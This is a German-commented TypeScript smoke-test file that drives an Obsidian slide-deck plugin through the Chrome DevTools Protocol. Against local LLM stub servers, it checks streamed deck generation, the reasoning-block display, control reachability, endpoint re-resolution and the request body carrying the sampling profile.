  const vorher = await cdp.evaluate<string>(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; return JSON.stringify(p.settings.llmEndpoints);`);
  try {
    const grund = await oeffneErzeugenPanel(cdp, stub);
    if (grund !== null) return grund;
    const knoepfeVorher = await cdp.evaluate<number>(`return document.querySelectorAll(".sd-gen-view .okit-stream-reasoning-copy").length;`);
    await cdp.evaluate(`document.querySelector(".sd-gen-view .sd-gen-cta button.mod-cta").click(); return true;`);
    const da = await pollUntil<boolean>(cdp, `
      const d = document.querySelector(".sd-gen-view .okit-stream-reasoning");
      return d && (d.querySelector("pre")?.textContent ?? "").includes(${JSON.stringify(KOPIER_MARKE)}) ? true : null;`, 30_000, 50);
    if (da === null) return "der Denk-Text erschien nie im Block";
    const urteile = await messeDenkblockKopierbar(cdp, { block: ".sd-gen-view .okit-stream-reasoning", knopf: ".sd-gen-view .okit-stream-reasoning-copy", enthaelt: KOPIER_MARKE, erwartetKnopf: true });
    await pollUntil<string>(cdp, `return document.querySelector(".sd-gen-view .sd-gen-running") ? null : "fertig";`, 60_000, 400);
    return { vorher: knoepfeVorher, urteile };
  } finally {
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llmEndpoints = JSON.parse(${JSON.stringify(vorher)});
      p.llm.invalidate();
      return true;
    `).catch(() => undefined);
    await stub.stop();
  }
}

/** G12–G16: die Pflichtpunkte § 3a (Baustein `pflichtpunkte` der Bruecke, Vorbild lingotuner). (a) im Eingabezustand: das Hinweisfeld
 *  ist der einzige Tipp-Ort mit eigener Beschriftung. (b) im LAUFENDEN Zustand, in dem der Strom waechst: der Stop-Knopf. Der Stub haelt
 *  den Strom nach dem letzten Stueck offen (`nachlaufMs`), damit der Zustand lange genug steht; am Ende bricht der Stop-Knopf ab. */
const FELD_HINWEIS = ".sd-gen-view .sd-gen-row input[placeholder]";
async function pflichtMessen(cdp: Cdp): Promise<string | { fokus: PflichtTeilurteil; gegenFokus: PflichtTeilurteil; hoch: PflichtTeilurteil; kurz: PflichtTeilurteil; gegen: PflichtTeilurteil }> {
  erzeugtePfade.push(STREAM_QUELLE, "smoke-stream-quelle — Deck.md");
  const stub = await startLlmStub({ models: ["google/gemma-4-e4b"], takt: 20, laenge: 8, nachlaufMs: 60_000 });
  stub.antworten([{ text: streamAntwort(true, 60), reasoning: STREAM_REASONING }]);
  const vorher = await cdp.evaluate<string>(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; return JSON.stringify(p.settings.llmEndpoints);`);
  try {
    const grund = await oeffneErzeugenPanel(cdp, stub);
    if (grund !== null) return grund;
    const fokus = await messeFokusErhalt(cdp, { selector: FELD_HINWEIS });
    const gegenFokus = await gegenprobeFokus(cdp, { selector: FELD_HINWEIS });
    await cdp.evaluate(`document.querySelector(".sd-gen-view .sd-gen-cta button.mod-cta").click(); return true;`);
    const lang = await pollUntil<boolean>(cdp, `const b = document.querySelector(${JSON.stringify(STREAM_BODY)}); return b && b.scrollHeight > b.clientHeight + 40 && document.querySelector(".sd-gen-view .sd-gen-cta button") ? true : null;`, 30_000, 100);
    if (!lang) return "der Strom erreichte die Obergrenze des Antwortbereichs nicht (Vorbedingung fuer (b))";
    const opts = { selektoren: [".sd-gen-view .sd-gen-cta button"], erforderlich: [".sd-gen-view .sd-gen-cta button"], fuelle: { in: STREAM_BODY }, ueberlauf: STREAM_BODY };
    const hoch = await messeErreichbarkeit(cdp, opts);
    const kurz = await mitHoehe<PflichtTeilurteil>(cdp, { element: ".workspace-leaf", enthaelt: ".sd-gen-view", hoehe: 420 }, () => messeErreichbarkeit(cdp, opts));
    const gegen = await gegenprobeErreichbarkeit(cdp, { selektoren: opts.selektoren, rollbereich: STREAM_BODY, fuelle: opts.fuelle });
    await cdp.evaluate(`document.querySelector(".sd-gen-view .sd-gen-cta button.mod-warning")?.click(); return true;`);
    await pollUntil<string>(cdp, `return document.querySelector(".sd-gen-view .sd-gen-running") ? null : "fertig";`, 30_000, 300);
    return { fokus, gegenFokus, hoch, kurz, gegen };
  } finally {
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llmEndpoints = JSON.parse(${JSON.stringify(vorher)});
      p.llm.invalidate();
      return true;
    `).catch(() => undefined);
    await stub.stop();
  }
}

const chatSektion: Section = {
  key: "chat",
  title: "G · Chat-Weg (Fehlerkoerper; mit --with-model Streaming und Abbruch gegen einen echten Endpunkt)",
  async run(cdp) {
    const starte = (name: string, endpoint: string, quelle: string, abbrechen: boolean, ziel: string): Promise<unknown> => cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      // Die Verbindung liest den Endpunkt aus den Settings: dieser Lauf zeigt auf den Prüf-Endpunkt.
      if (!("__sdGVorher" in globalThis)) globalThis.__sdGVorher = JSON.stringify({ e: p.settings.llmEndpoints });
      p.settings.llmEndpoints = [{ url: ${JSON.stringify(endpoint)}, model: ${JSON.stringify(G_MODEL)} }];
      p.llm.invalidate();
      const st = { updates: 0, chars: 0, erstesNach: 0, abbruchNach: 0, fertig: false, ergebnis: null, dauer: 0, t0: Date.now() };
      globalThis[${JSON.stringify(name)}] = st;
      const h = p.startDeckGeneration({
        sourceBody: ${JSON.stringify(quelle)}, slideTarget: ${abbrechen ? 12 : 3}, hint: "",
        themeKey: p.settings.defaultTheme, model: ${JSON.stringify(G_MODEL)},
        targetPath: ${JSON.stringify(ziel)}, replace: true, sourceLink: "[[smoke]]",
      });
      h.subscribe((s) => {
        const n = (s.content ?? "").length + (s.reasoning ?? "").length;
        if (n > 0 && n !== st.chars) {
          st.updates++; st.chars = n;
          if (!st.erstesNach) st.erstesNach = Date.now() - st.t0;
          if (${abbrechen} && !st.abbruchNach) { st.abbruchNach = Date.now() - st.t0; h.abort(); }
        }
      });
      h.done.then((r) => { st.ergebnis = r; st.dauer = Date.now() - st.t0; st.fertig = true; });
      return true;
    `);
    const warte = async (name: string, ms: number): Promise<{ updates: number; erstesNach: number; abbruchNach: number; dauer: number; ergebnis: { status: string; error?: string; kind?: string; markdown?: string } } | null> => {
      const roh = await pollUntil<string>(cdp, `const st = globalThis[${JSON.stringify(name)}]; return st && st.fertig ? JSON.stringify(st) : null;`, ms, 2000);
      return roh ? JSON.parse(roh) : null;
    };
    // G3 braucht kein Modell: ein Fake-Server antwortet auf den Chat-POST mit HTTP 200 und einem Fehler-Body.
    // Seit dem Verbindungs-Tausch kommt der Endpunkt aus der Aufloesung — ein "falscher Pfad" gaebe
    // schon dort "kein Endpunkt" und erreichte den Fehlerkoerper nie (umgeschrieben, Welle 15).
    const QUELLE_G3 = "# Wandern\n\nEine Tagestour braucht Wasser, feste Schuhe und eine Karte.";
    const fehler = await startFakeChat({ fehlerKoerper: true });
    try {
      await starte("__sdG3", fehler.url, QUELLE_G3, false, "smoke-chat-g3.md");
      const g3 = await warte("__sdG3", 60_000);
      record("G3 Fehlerkoerper: HTTP 200 + Fehler-Body auf dem Chat-Weg wird zur Meldung (umgeschrieben)",
        g3 !== null && g3.ergebnis.status === "fatal" && g3.ergebnis.kind === "server" && (g3.ergebnis.error ?? "").includes("Model has crashed"),
        g3 ? `${g3.ergebnis.status}/${g3.ergebnis.kind} · Meldung: "${g3.ergebnis.error}" · POSTs: ${fehler.bodies.length}` : "nach 60 s nicht beendet");
    } finally {
      await fehler.close();
    }


    // G4–G8: der Strom im Erzeugen-Panel (kein Modell noetig: der zentrale Stub), gemessen mit `messeFolge` der Bruecke. Die Gueltigkeit
    // steht im Urteil (Ueberlauf >= 80 px, mindestens 3 Staende, Vorbedingung „der Bereich folgte vor der Stoerung“); sonst „nichts gemessen“.
    const G4 = "G4 Folge-Regel: Hochscrollen mitten im Strom des Erzeugen-Panels wird respektiert";
    const G5 = "G5 Kontrolle: ohne Stoerung folgt der Strom des Erzeugen-Panels bis zum Ende";
    const G6 = "G6 Denkblock live: der Denk-Text steht waehrend des Stroms offen und waechst";
    const G7 = "G7 Kontrolle mit Absatzwechseln: der Strom folgt auch, wenn ein Stueck mehrere Zeilen auf einmal bringt";
    const G8 = "G8 Wiederaufnahme: steht der Nutzer nach dem Hochscrollen wieder unten, folgt der Strom wieder";
        // G5: tokengrosse Stuecke, nur einfache Zeilenumbrueche — der Massstab fuer „folgt“, ohne dass ein Stueck die Folge-Schwelle springt.
    // G6: derselbe Strom MIT Denk-Text: der Denk-Text steht offen, ist sichtbar und waechst.
    const mitDenken = await stromMessen(cdp, { kontrolle: true, stoerung: false, wiederaufnahme: false, mitDenken: true });
    if (typeof mitDenken === "string") {
      bilanz.unmeasured(G5, mitDenken);
      bilanz.unmeasured(G6, mitDenken);
    } else {
      zeichneFolge(bilanz, { kontrolle: G5 }, mitDenken.ergebnis);
      const verschieden = new Set(mitDenken.denken.map((z) => z.rl)).size;
      if (verschieden < 2) {
        bilanz.unmeasured(G6, `der Denk-Text wuchs hoechstens ${verschieden}-mal`);
      } else {
        const offen = mitDenken.denken.every((z) => z.open);
        const sichtbar = mitDenken.denken.every((z) => z.vis);
        record(G6, offen && sichtbar, `${verschieden} Staende (${mitDenken.denken[0]?.rl}→${mitDenken.denken[mitDenken.denken.length - 1]?.rl} Zeichen) · offen: ${offen} · sichtbar: ${sichtbar}`);
      }
    }
    // G7: Absatzwechsel wie in einem echten Deck (`\\n\\n` in einem Stueck, ueber 40 px Zuwachs). Mit obsidian-kit < 0.59.0 misst `followTail` „unten?“
    // erst NACH dem Wachsen: der erste Absatzwechsel beendet das Folgen. Rot auf altem Pin, gruen ab 0.59.0.
    const absaetze = await stromMessen(cdp, { kontrolle: true, stoerung: false, wiederaufnahme: false, leerzeilen: true });
    if (typeof absaetze === "string") bilanz.unmeasured(G7, absaetze);
    else zeichneFolge(bilanz, { kontrolle: G7 }, absaetze.ergebnis);
    // G4 + G8: Stoerung (scrollTop = 0), danach darf der Bereich nicht zum Ende springen; steht der Nutzer wieder unten, folgt er wieder.
    // Laengerer Strom (36 Folien), weil die dritte Phase Staende braucht.
    const gestoert = await stromMessen(cdp, { kontrolle: false, stoerung: true, wiederaufnahme: true, folien: 36 });
    if (typeof gestoert === "string") {
      bilanz.unmeasured(G4, gestoert);
      bilanz.unmeasured(G8, gestoert);
    } else {
      zeichneFolge(bilanz, { folge: G4, wiederaufnahme: G8 }, gestoert.ergebnis);
    }

    // G9: Erzeugen-Panel offen ohne Endpunkt (Knopf gesperrt), Endpunkt wird nachtraeglich gesetzt, der Nutzer schaltet den Tab weg und zurueck.
    // Gegenprobe: ohne die Neuaufloesung in `GeneratePanel.onShow` bleibt der Knopf gesperrt (Task Welle 23, Erzeugen-Panel).
    const G9 = "G9 Ein nachtraeglich eingerichteter Endpunkt wird beim Zurueckschalten auf den Tab erkannt (Knopf wird aktiv)";
    {
      const stub9 = await startLlmStub({ models: ["google/gemma-4-e4b"], takt: 20, laenge: 8, nachlaufMs: 160 });
      const vorher9 = await cdp.evaluate<string>(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; return JSON.stringify(p.settings.llmEndpoints);`);
      try {
        erzeugtePfade.push(STREAM_QUELLE);
        await cdp.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.llmEndpoints = [];
          p.llm.invalidate();
          app.workspace.detachLeavesOfType("slide-deck-hub");
          const q = app.vault.getAbstractFileByPath(${JSON.stringify(STREAM_QUELLE)});
          const text = "# Wandern\\n\\nEine Tagestour braucht Wasser.";
          if (q) await app.vault.modify(q, text); else await app.vault.create(${JSON.stringify(STREAM_QUELLE)}, text);
          return true;
        `);
        if (!(await openExisting(cdp, STREAM_QUELLE, "source"))) {
          bilanz.unmeasured(G9, `Quellnotiz ${STREAM_QUELLE} liess sich nicht oeffnen`);
        } else {
          await cdp.evaluate(`await app.commands.executeCommandById("${PLUGIN_ID}:generate-deck"); return true;`);
          const KNOPF = `document.querySelector(".sd-gen-view .sd-gen-cta button.mod-cta")`;
          const gesperrt = await pollUntil<boolean>(cdp, `const b = ${KNOPF}; return b && b.disabled && (document.querySelector(".sd-gen-view")?.textContent ?? "").length > 0 ? true : null;`, 15_000, 300);
          if (!gesperrt) {
            bilanz.unmeasured(G9, "Vorbedingung verfehlt: das Panel zeigte ohne Endpunkt keinen gesperrten Knopf");
          } else {
            await cdp.evaluate(`
              const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
              p.settings.llmEndpoints = [{ url: ${JSON.stringify(stub9.url)}, model: "google/gemma-4-e4b" }];
              p.llm.invalidate();
              await p.llm.resolve({ force: true });
              return true;
            `);
            // Vorbedingung: ohne Tab-Wechsel bleibt der Knopf gesperrt (so ist der Zustand des Befunds hergestellt).
            await new Promise((r) => setTimeout(r, 600));
            const nochGesperrt = await cdp.evaluate<boolean>(`const b = ${KNOPF}; return !!b && b.disabled;`);
            // Tab weg und zurueck: der Nutzer geht in einen anderen Tab des Hubs und kehrt zurueck.
            await cdp.evaluate(`
              const tabs = [...document.querySelectorAll(".okit-hub-tab")];
              const weg = tabs.find((t) => t.getAttribute("data-tab") !== "generate");
              const hin = tabs.find((t) => t.getAttribute("data-tab") === "generate");
              if (!weg || !hin) return false;
              weg.click(); await new Promise((r) => setTimeout(r, 300)); hin.click();
              return true;
            `);
            const aktiv = await pollUntil<boolean>(cdp, `const b = ${KNOPF}; return b && !b.disabled ? true : null;`, 15_000, 300);
            if (!nochGesperrt) bilanz.unmeasured(G9, "Vorbedingung verfehlt: der Knopf war schon vor dem Tab-Wechsel aktiv");
            else record(G9, aktiv === true, aktiv ? "Knopf gesperrt → nach Tab-Wechsel aktiv" : "Knopf blieb nach Tab-Wechsel gesperrt (Endpunkt nicht neu aufgeloest)");
          }
        }
      } finally {
        await cdp.evaluate(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; p.settings.llmEndpoints = JSON.parse(${JSON.stringify(vorher9)}); p.llm.invalidate(); app.workspace.detachLeavesOfType("slide-deck-hub"); return true;`);
        await stub9.stop();
      }
    }

    {
      const G10 = "G10 Gemma 4 ohne Oeffner: der Denktext steht im Denkblock, nicht im Antwortbereich";
      const g10 = await gemmaMessen(cdp);
      if (typeof g10 === "string") bilanz.unmeasured(G10, g10);
      else record(G10, !g10.mid.includes("waege") && !g10.mid.includes("channel") && g10.denken.includes("waege"),
        `mitten im Strom „${g10.mid.slice(0, 40)}“ · Denkblock „${g10.denken.slice(0, 40)}“ · Ende: „${g10.ende.slice(0, 60)}“`);
    }

    {
      const G11 = "G11 Denkblock kopierbar: der Kopier-Knopf erscheint erst mit Denk-Text, kopiert ihn in die Zwischenablage, quittiert am Knopf und klappt den Block nicht um";
      const G11B = "G11b Gegenprobe: lehnt die Zwischenablage ab, quittiert der Knopf nicht";
      const g11 = await kopierMessen(cdp);
      if (typeof g11 === "string") { bilanz.unmeasured(G11, g11); bilanz.unmeasured(G11B, g11); }
      else {
        // Die Vorbedingung „vor dem Denken kein Knopf“ liegt ausserhalb des Bausteins und gehoert zum Urteil von G11.
        const kopie = g11.urteile.kopie;
        const urteile: DenkblockUrteile = g11.vorher === 0 || kopie.urteil !== "gruen"
          ? { ...g11.urteile, kopie: { ...kopie, detail: `Knoepfe vor dem Denken: ${g11.vorher} (erwartet 0) · ${kopie.detail}` } }
          : { ...g11.urteile, kopie: { urteil: "rot", detail: `Knoepfe vor dem Denken: ${g11.vorher} (erwartet 0) · ${kopie.detail}` } };
        zeichneDenkblock({ record: (n, p, d) => record(n, p, d ?? ""), unmeasured: (n, g) => bilanz.unmeasured(n, g) } satisfies PflichtBilanz, { kopie: G11, gegen: G11B }, urteile);
      }
    }

    {
      const NAMEN = ["G12 Pflicht (a): das Eingabefeld des Erzeugen-Panels behaelt den Fokus, wenn ein Neuzeichnen ausgeloest wird", "G13 Pflicht (a), Gegenprobe: ein Neuzeichnen mit Fokusverlust macht G12 rot", "G14 Pflicht (b): im laufenden Strom ist jedes Bedienelement erreichbar (natuerliche Hoehe, Strom ueber der Obergrenze)", "G15 Pflicht (b): auch im kurzen Panel (420 px) ist jedes Bedienelement erreichbar", "G16 Pflicht (b), Gegenprobe: ohne Rollbalken wird etwas unerreichbar"] as const;
      const pf = await pflichtMessen(cdp);
      if (typeof pf === "string") for (const n of NAMEN) bilanz.unmeasured(n, pf);
      else {
        const zeichne = (name: string, u: PflichtTeilurteil): void => { if (u.urteil === "nichts-gemessen") bilanz.unmeasured(name, `Messung ungueltig: ${u.detail}`); else record(name, u.urteil === "gruen", u.detail); };
        zeichne(NAMEN[0], pf.fokus);
        zeichne(NAMEN[1], pf.gegenFokus);
        zeichne(NAMEN[2], pf.hoch);
        zeichne(NAMEN[3], pf.kurz);
        // Gemessen (Welle 24): Stop sitzt UNTER dem Antwortbereich, der Antwortbereich rollt in sich (max-height 320 px). Dem Bereich den Rollbalken
        // zu nehmen veraendert nichts an der Lage des Knopfs — die Gegenprobe kann hier nie rot werden: nicht anwendbar, nicht gruen.
        if (pf.gegen.urteil === "rot" && pf.gegen.detail.startsWith("overflow:hidden, aber alle")) bilanz.skipped(NAMEN[4], `in dieser Lage nicht anwendbar: der Stop-Knopf steht ausserhalb des Rollbereichs (${pf.gegen.detail})`);
        else zeichne(NAMEN[4], pf.gegen);
      }
    }

    if (!MIT_MODELL) {
      skipped("G1 Streaming: Deck aus einer Notiz, Text kommt in mehreren Stuecken", "--with-model fehlt");
      skipped("G2 Abbruch: Stop beendet die Generierung zuegig, es wird nichts geschrieben", "--with-model fehlt");
      return;
    }
    const QUELLE = "# Wandern\n\nEine Tagestour braucht Wasser, feste Schuhe und eine Karte. Am Gipfel gibt es Brotzeit; abends geht es zurueck ins Tal.";
    const LANG = "# Geschichte des Radios\n\n" + "Das Radio entstand aus den Arbeiten vieler Erfinder. ".repeat(60);

    erzeugtePfade.push(G_NOTE);
    await starte("__sdG1", G_ENDPOINT, QUELLE, false, G_NOTE);
    const g1 = await warte("__sdG1", 300_000);
    record("G1 Streaming: Deck aus einer Notiz, Text kommt in mehreren Stuecken",
      g1 !== null && g1.ergebnis.status === "ok" && g1.updates > 1,
      g1 ? `${g1.updates} Zustandsmeldung(en), erstes nach ${g1.erstesNach} ms, Ende nach ${g1.dauer} ms · ${g1.ergebnis.status}${g1.ergebnis.error ? ` (${g1.ergebnis.error})` : ""}` : "nach 300 s nicht beendet");

    await starte("__sdG2", G_ENDPOINT, LANG, true, "smoke-chat-g2.md");
    const g2 = await warte("__sdG2", 120_000);
    const g2Datei = await cdp.evaluate<boolean>(`return app.vault.getAbstractFileByPath("smoke-chat-g2.md") !== null;`);
    record("G2 Abbruch: Stop beendet die Generierung zuegig, es wird nichts geschrieben",
      g2 !== null && g2.ergebnis.status === "aborted" && g2.dauer - g2.abbruchNach < 3000 && !g2Datei,
      g2 ? `Abbruch nach ${g2.abbruchNach} ms, Ende nach ${g2.dauer} ms · ${g2.ergebnis.status} · Notiz geschrieben: ${g2Datei}` : "nach 120 s nicht beendet");
    if (g2Datei) erzeugtePfade.push("smoke-chat-g2.md");

  },
};

/** R — Sampling-Profil (Modus creative): Abschnitt „Anfrage“ in den Einstellungen, die Zeile „Denk-Test“
 *  darunter und der GESENDETE Body. Kein echtes Modell noetig. N2 faehrt ZWEI Edits hintereinander
 *  (setzen, zuruecksetzen): der Einklapp-Fehler des Piloten war im gruenen Smoke unsichtbar, weil kein
 *  Punkt zwei Edits nacheinander fuhr (Plan-Nachtrag 6). */
const ANFRAGE_KOPF = `[...wurzel.querySelectorAll(".okit-collapsible-header")].find((h) => /Anfrage|Request/.test(h.textContent || ""))`;

/** Fake-Chat-Endpunkt im Node-Prozess; merkt sich jeden POST-Body. Mit CORS-Freigabe, damit der
 *  Stream-Weg (XHR) durchkommt und der Body vom echten Transport stammt. */
async function startFakeChat(opts: { fehlerKoerper?: boolean; antwort?: string } = {}): Promise<{ url: string; bodies: unknown[]; auth: (string | undefined)[]; close(): Promise<void> }> {
  // Der zentrale LLM-Stub (`tools/obsidian-cdp/llm-stub.ts`): strenge Pfade, CORS, Mitschnitt jeder Anfrage samt Kopfzeilen.
  const stub = await startLlmStub({
    models: ["google/gemma-4-e4b"],
    antwort: (a) => {
      if (a.route !== "chat") return undefined;
      // G3: HTTP 200 mit Fehler-Body statt Stream — die Form, in der LM Studio ein abgestuerztes Modell meldet.
      if (opts.fehlerKoerper === true) return { fehler: "Model has crashed without additional information.", fehlerAls200: true, fehlerForm: "string" };
      // Spiegelt einen Platzhalter der Schwaerzung zurueck, falls die Anfrage einen enthielt (V3).
      const echo = /\[redacted-[a-z]+-\d+\]/.exec(a.body)?.[0];
      return opts.antwort ?? (echo ? `kein Deck ${echo}` : "kein Deck");
    },
  });
  const chat = (): StubAnfrage[] => stub.anfragen().filter((a) => a.route === "chat");
  return {
    url: stub.url,
    get bodies() { return chat().map((a) => a.json ?? { kein_json: a.body.slice(0, 80) }); },
    get auth() { return chat().map((a) => (typeof a.header.authorization === "string" ? a.header.authorization : undefined)); },
    close: () => stub.stop(),
  };
}

const anfrage: Section = {
  key: "anfrage",
  title: "R · Anfrage (Sampling-Profil creative)",
  async run(cdp, ctx) {
    const offen = await oeffneTab(cdp, ctx);
    try {
      // N1 — der Wechsel in BEIDE Richtungen. Der Auf/Zu-Zustand lebt im Prozess (Kit-Fallback ohne
      // collapsedStorage) und ueberlebt das Schliessen der Einstellungen: der Ausgangszustand ist
      // nicht vorhersagbar, also wird der Wechsel gemessen, nicht ein fester Zielzustand.
      const n1 = JSON.parse(await offen.ziel.evaluate<string>(`
        const warte = (ms) => new Promise((x) => setTimeout(x, ms));
        const wurzel = document.querySelector(".vertical-tab-content");
        const kopf = ${ANFRAGE_KOPF};
        if (!kopf) return JSON.stringify({ da: false });
        const body = kopf.closest(".okit-collapsible").querySelector(".okit-collapsible-body");
        const offenJetzt = () => !body.classList.contains("is-collapsed");
        const s0 = offenJetzt(); kopf.click(); await warte(150);
        const s1 = offenJetzt(); kopf.click(); await warte(150);
        return JSON.stringify({ da: true, s0, s1, s2: offenJetzt() });
      `)) as { da: boolean; s0: boolean; s1: boolean; s2: boolean };
      record("R1 Abschnitt „Anfrage“ klappt auf und wieder zu", n1.da && n1.s1 === !n1.s0 && n1.s2 === n1.s0,
        n1.da ? `offen: ${n1.s0} → ${n1.s1} → ${n1.s2}` : "kein .okit-collapsible-header mit „Anfrage“/„Request“");

      // N2 — Temperatur setzen, dann zuruecksetzen; der Abschnitt bleibt offen.
      const n2 = JSON.parse(await offen.ziel.evaluate<string>(`
        const warte = (ms) => new Promise((x) => setTimeout(x, ms));
        const wurzel = () => document.querySelector(".vertical-tab-content");
        let kopf = (() => { const wurzel2 = wurzel(); return ${ANFRAGE_KOPF.replace(/wurzel\./, "wurzel2.")}; })();
        if (!kopf) return JSON.stringify({ da: false });
        if (kopf.closest(".okit-collapsible").querySelector(".okit-collapsible-body").classList.contains("is-collapsed")) kopf.click();
        await warte(200);
        const offenJetzt = () => { const k = [...wurzel().querySelectorAll(".okit-collapsible-header")].find((h) => /Anfrage|Request/.test(h.textContent || "")); return !!k && !k.closest(".okit-collapsible").querySelector(".okit-collapsible-body").classList.contains("is-collapsed"); };
        const feld = () => wurzel().querySelector('input[data-field="temperature"]');
        const f1 = feld();
        if (!f1) return JSON.stringify({ da: true, feld: false });
        f1.value = "0.9"; f1.dispatchEvent(new Event("blur")); await warte(400);
        const nachSetzen = { eigen: !!feld() && feld().classList.contains("okit-request-own"), offen: offenJetzt(), wert: feld() ? feld().value : null };
        const reset = feld() ? feld().closest(".setting-item").querySelector(".clickable-icon") : null;
        if (reset) reset.click();
        await warte(400);
        return JSON.stringify({ da: true, feld: true, reset: !!reset, nachSetzen, nachReset: { eigen: !!feld() && feld().classList.contains("okit-request-own"), offen: offenJetzt() } });
      `)) as { da: boolean; feld?: boolean; reset?: boolean; nachSetzen?: { eigen: boolean; offen: boolean; wert: string | null }; nachReset?: { eigen: boolean; offen: boolean } };
      const n2ok = !!(n2.da && n2.feld && n2.reset && n2.nachSetzen?.eigen && n2.nachSetzen.offen && n2.nachSetzen.wert === "0.9" && n2.nachReset && !n2.nachReset.eigen && n2.nachReset.offen);
      record("R2 Wert ueberschreiben, dann zuruecksetzen — der Abschnitt bleibt aufgeklappt (zwei Edits hintereinander)", n2ok,
        n2.nachSetzen && n2.nachReset ? `nach Setzen: eigener Wert=${n2.nachSetzen.eigen}, Wert=${n2.nachSetzen.wert}, offen=${n2.nachSetzen.offen} · nach Zuruecksetzen: eigener Wert=${n2.nachReset.eigen}, offen=${n2.nachReset.offen}` : JSON.stringify(n2));

      // N3 — die Zeile „Denk-Test“ folgt dem Abschnitt und traegt einen Knopf, keinen Schalter. Seit dem
      // Verbindungs-Tausch zeichnet das Kit Quelle, Liste und Anfrage in EINEM Block; Modell und Budget
      // des Plugins stehen danach, der Denk-Test zuletzt (umgeschrieben: vorher „direkt darunter“).
      const n3 = JSON.parse(await offen.ziel.evaluate<string>(`
        const wurzel = document.querySelector(".vertical-tab-content");
        const kopf = ${ANFRAGE_KOPF};
        if (!kopf) return JSON.stringify({ da: false });
        const zeile = [...wurzel.querySelectorAll(".setting-item")].find((z) => /Denk-Test|Thinking test/.test(z.querySelector(".setting-item-name")?.textContent || ""));
        const danach = !!zeile && !!(kopf.compareDocumentPosition(zeile) & Node.DOCUMENT_POSITION_FOLLOWING);
        return JSON.stringify({ da: true, zeile: !!zeile, danach, knopf: !!zeile && !!zeile.querySelector("button"), schalter: !!zeile && !!zeile.querySelector(".checkbox-container") });
      `)) as { da: boolean; zeile?: boolean; danach?: boolean; knopf?: boolean; schalter?: boolean };
      record("R3 Zeile „Denk-Test“ folgt dem Anfrage-Abschnitt, mit Knopf statt Schalter (umgeschrieben)",
        !!n3.da && n3.zeile === true && n3.danach === true && n3.knopf === true && n3.schalter === false, JSON.stringify(n3));

      // N4 — Denkstufe im Abschnitt waehlen: gespeichert, Abschnitt bleibt offen.
      const n4 = JSON.parse(await offen.ziel.evaluate<string>(`
        const warte = (ms) => new Promise((x) => setTimeout(x, ms));
        const wurzel = () => document.querySelector(".vertical-tab-content");
        const zeile = () => [...wurzel().querySelectorAll(".setting-item")].find((z) => /Denkstufe|Thinking level/.test(z.querySelector(".setting-item-name")?.textContent || ""));
        const sel = zeile() ? zeile().querySelector("select") : null;
        if (!sel) return JSON.stringify({ da: false });
        sel.value = "high"; sel.dispatchEvent(new Event("change")); await warte(400);
        const k = [...wurzel().querySelectorAll(".okit-collapsible-header")].find((h) => /Anfrage|Request/.test(h.textContent || ""));
        return JSON.stringify({ da: true, offen: !!k && !k.closest(".okit-collapsible").querySelector(".okit-collapsible-body").classList.contains("is-collapsed") });
      `)) as { da: boolean; offen?: boolean; gespeichert?: string };
      // `app` gibt es nur im Hauptfenster — die Settings sind ein eigenes CDP-Target.
      n4.gespeichert = await cdp.evaluate<string>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.request.thinking.creative;`);
      record("R4 Denkstufe waehlen wird gespeichert, der Abschnitt bleibt aufgeklappt", !!n4.da && n4.offen === true && n4.gespeichert === "high", JSON.stringify(n4));
    } finally {
      await schliesseTab(cdp, offen);
    }

    // N5 — der GESENDETE Body. Fake-Server im Node-Prozess; Modell google/gemma-4-e4b (Familie gemma4 aus
    // dem Namen, Backend unbekannt). Die Antwort ist kein Deck → Format-Fehler, zwei POSTs, keine Notiz.
    const fake = await startFakeChat();
    try {
      const tmp = "smoke-anfrage-n5.md";
      erzeugtePfade.push(tmp);
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.request = { overrides: {}, thinking: { creative: "off" }, lastOnLevel: {}, levelPickerInChat: false };
        p.settings.llmEndpoints = [{ url: ${JSON.stringify(fake.url)}, model: "google/gemma-4-e4b" }];
        p.llm.invalidate();
        await p.llm.resolve();
        const h = p.startDeckGeneration({
          sourceBody: "# Probe\\n\\nEin Satz.", slideTarget: 3, hint: "", themeKey: p.settings.defaultTheme,
          model: "google/gemma-4-e4b", targetPath: ${JSON.stringify(tmp)}, replace: true, sourceLink: "[[smoke]]",
        });
        globalThis.__sdN5 = { fertig: false }; h.done.then((r) => { globalThis.__sdN5 = { fertig: true, status: r.status }; });
        return true;
      `);
      const ende = await pollUntil<string>(cdp, `const s = globalThis.__sdN5; return s && s.fertig ? JSON.stringify(s) : null;`, 60_000, 500);
      const body = fake.bodies[0] as Record<string, unknown> | undefined;
      const erwartet = MODES.creative.temperature.value;
      record("R5 Der gesendete Body traegt das Profil des Modus creative (Temperatur aus den Kit-Tabellen, Budget als max_tokens)",
        !!body && body.temperature === erwartet && typeof body.max_tokens === "number" && body.max_tokens >= 8192 && !("chat_template_kwargs" in body),
        body ? `Server sah temperature=${String(body.temperature)} (Erwartung aus MODES.creative: ${erwartet}), max_tokens=${String(body.max_tokens)}, Schluessel ${JSON.stringify(Object.keys(body).filter((k) => k !== "messages"))} · Lauf ${ende ?? "nicht beendet"} · POSTs: ${fake.bodies.length}` : `der Fake-Server sah keinen POST (${ende ?? "Lauf nicht beendet"})`);
    } finally {
      await fake.close();
    }
  },
};


/** V — was der Tausch auf die Kit-Verbindung an der Leitung und auf der Platte aendert: der Schluessel
 *  zieht in den Schluesselbund, geht als Bearer hinaus, und ein Geheimnis im Prompt verlaesst den
 *  Rechner als Platzhalter und kommt als Original zurueck. Neu mit dem Tausch (Welle 15), keine Baseline. */
/** Ein Server, der nur zaehlt, WAS bei ihm anklopft (Pfade). Der Zaehler steht am Draht, nicht im DOM:
 *  "nichts geladen" heisst hier, dass der Server nie angesprochen wurde. */
